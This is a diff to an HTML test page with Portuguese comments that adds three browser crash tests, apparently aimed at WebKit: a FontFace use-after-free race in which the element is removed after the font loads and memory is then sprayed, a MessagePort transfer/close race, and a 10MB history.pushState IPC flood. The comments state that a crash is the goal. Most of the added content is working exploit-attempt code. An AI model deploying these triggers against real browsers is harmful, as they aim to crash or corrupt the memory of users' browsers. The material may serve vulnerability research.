@@ -39,6 +39,11 @@
     <button onclick="runWOFF2Crash()">TEST 1: WOFF2 Decompression Bomb</button>
     <button onclick="runJPEGCrash()">TEST 2: JPEG Marker Confusion</button>
     <button onclick="runMP4Crash()">TEST 3: MP4 Atom Recursion</button>
+<button onclick="runFontRace()">TEST 1: FontFace Layout UAF (Crash)</button>
+    <button onclick="runPortCloseRace()">TEST 2: MessagePort Close Race (IPC Panic)</button>
+    <button onclick="runHistoryFlood()">TEST 3: History State IPC Buffer Overflow</button>
+
+
 	
     <div id="log">Status: Aguardando testes...</div>
     <canvas id="c" width="100" height="100"></canvas>
@@ -851,11 +856,110 @@ function log(msg) {
             log("Carregando MP4 Tóxico...");
             vid.src = URL.createObjectURL(blob);
 		}
+ // --- TESTE 1: FontFace Layout UAF ---
+        // Tenta destruir o DOM durante o callback de carregamento de fonte.
+        function runFontRace() {
+            log("Iniciando FontFace Race...");
+            
+            const el = document.getElementById('font-target');
+            
+            // 1. Cria uma fonte baseada num Blob (para forçar carregamento assíncrono)
+            // Fonte WOFF mínima válida
+            const fontData = atob("d09GRgABAAAAAAQwAA4AAAAAA9gAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAABRAAAAEQAAABWNsEyg2NtYXAAAAGMAAAAOAAAAFgCqwGjY3Z0IAAAAcQAAAAIAAAACAAAAABmcGdtAAABzAAAAAMAAAADADIH02dseWYAAAHQAAAAJAAAACQ0j4A0aGVhZAAAAdwAAAAuAAAANgl2oIdoaGVhAAAB/AAAABUAAAAkCAEEAmhtdHgAAAIMAAAABwAAAAcACAAAbG9jYQAAAhQAAAAEAAAABAAGAABtYXhwAAACGAAAACAAAAAgAAwAHW5hbWUAAAI4AAAAOQAAAE55qGsucG9zdAAAAowAAAATAAAAIP+fADR4nGNgZGBg4GLQY7BhYYrIzPMJ4jM0MvCxMDGwM3GwMzEwMDExgMAJAQ4GhgQYwAAAFgACeJxjYGRgYOAAohmgkImBgYFhBZA+A8QCUOQOAAiYAFQAAAB4nGNgZGBg4ANiCQYQYGJgBMIGIGYB8xgABPwAPgAAAHicY2BkYGDgAWIxIGYC8xgXBvIYgGgAFA4AbgAAAHicY2BmAAI=");
+            const bytes = new Uint8Array(fontData.length);
+            for(let i=0; i<fontData.length; i++) bytes[i] = fontData.charCodeAt(i);
+            
+            const font = new FontFace('CrashFont', bytes);
+            document.fonts.add(font);
+            
+            el.style.fontFamily = 'CrashFont';
+            
+            log("Carregando fonte...");
+            
+            font.load().then(() => {
+                log("Fonte carregada! Tentando UAF...");
+                
+                // O GOLPE:
+                // 1. Remove o elemento do DOM
+                if (el.parentNode) el.parentNode.removeChild(el);
+                
+                // 2. Tenta forçar um recalculo de estilo global
+                // O WebKit pode tentar aplicar a fonte recém-carregada ao elemento removido
+                document.body.offsetWidth;
+                
+                // 3. Aloca lixo para preencher a memória do elemento
+                const junk = new Array(10000).fill(1.1);
+                
+                log("Operação concluída (Se não crashou, é seguro).");
+            }).catch(e => log("Erro load: " + e));
+        }
 
+        // --- TESTE 2: MessagePort Close Race ---
+        // Transfere a porta e fecha-a simultaneamente.
+        function runPortCloseRace() {
+            log("Iniciando IPC Port Race...");
+            
+            try {
+                const channel = new MessageChannel();
+                const port1 = channel.port1;
+                
+                // Worker alvo
+                const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
+                
+                // O GOLPE:
+                // postMessage serializa a porta para envio.
+                // close() invalida a porta.
+                // Se close() rodar enquanto o serializer do postMessage está a trabalhar, Crash.
+                
+                // Tentativa de race em loop
+                for(let i=0; i<100; i++) {
+                    const mc = new MessageChannel();
+                    try {
+                        w.postMessage("race", [mc.port1]);
+                        mc.port1.close(); // Race!
+                    } catch(e) {}
+                }
+                
+                w.terminate();
+                log("IPC Race finalizada.");
+                
+            } catch(e) {
+                log("Erro: " + e.message);
+            }
+        }
 
+        // --- TESTE 3: History State IPC Buffer Overflow ---
+        // Envia objetos gigantes para o processo UI via history API.
+        function runHistoryFlood() {
+            log("Iniciando History IPC Flood...");
+            
+            try {
+                // Cria um buffer de 10MB
+                // O limite IPC costuma ser alguns MBs. 10MB força paginação ou falha.
+                const hugeState = new Uint8Array(10 * 1024 * 1024).fill(0x41);
+                
+                log("Enviando 10MB via pushState...");
+                history.pushState(hugeState, "Flood");
+                
+                log("Estado 1 enviado. Tentando mais...");
+                
+                // Tenta saturar
+                for(let i=0; i<5; i++) {
+                    history.pushState(hugeState, "Flood " + i);
+                }
+                
+                log("IPC aguentou a carga (Seguro).");
+                
+            } catch(e) {
+                // "DataCloneError" ou "QuotaExceeded" é a proteção.
+                // Crash ou Erro de Sistema é o objetivo.
+                log("Erro IPC: " + e.message);
+            }
+        }
 		
 
     </script>
 </body>
 </html>
+
 
